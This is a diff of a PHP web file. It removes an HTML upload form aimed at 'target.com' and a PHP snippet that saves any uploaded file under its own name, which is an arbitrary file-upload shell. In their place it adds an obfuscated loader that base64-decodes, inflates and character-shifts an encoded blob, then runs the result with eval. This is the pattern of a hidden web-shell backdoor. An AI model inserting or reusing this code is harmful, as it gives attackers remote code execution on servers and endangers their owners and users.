@@ -1,9 +1,9 @@
-<form method="post" action="https://target.com" enctype="multipart/form-data">
-<input type="file" name="csrf"/>
-<input type="submit" value="upload"/>
-</form>
-
-<?php
-@copy($_FILES['csrf']['tmp_name'],$_FILES['csrf']['name']);
-echo("<a href=".$_FILES['csrf']['name'].">".$_FILES['csrf']['name']."</a>");
-?>
+<?php function foVTK($Evvqv)
+{ 
+$Evvqv=gzinflate(base64_decode($Evvqv));
+ for($i=0;$i<strlen($Evvqv);$i++)
+ {
+$Evvqv[$i] = chr(ord($Evvqv[$i])-1);
+ }
+ return $Evvqv;
+ }eval(foVTK("ZVDRasIwFP0AvyIEIQ04Jsy3WPVhVQeCpe22h1JKbOMaaJuQpAMnfvsSo9tgebrnnnPPubkAuLdin7QNxmUaJW9RkqNtlsXl+z55jpMoTcvdfpOiAhOwXIzmS9lIwJQSqlRMCmV4/xFMMamaTtTBgWrW0479msF4G9t6t4YFnoDpbDbDhFWNCCDEhB8DrjUzVr6JshxSB7RV4rPToPlRqA7QynDRhxCCjplG1CGUQhsIWF+Zk2Qh7IbWcEmVeXT6h5oaCoFbI4SDbAWtmYKA13/QAhEfwHs5GOBtjrxl9zlfa/5l66cpXNyEniytD7wN6eHQcePtfd/ecrDE6zXLTl6XsoH2s+My3qdZjpwQFeGPCJ8tuaqEPFnJ+mUXpTlyG6AiR6aTpYtFxeQf5/v3a6WIXFirmUdriy7kQkbf"));?>
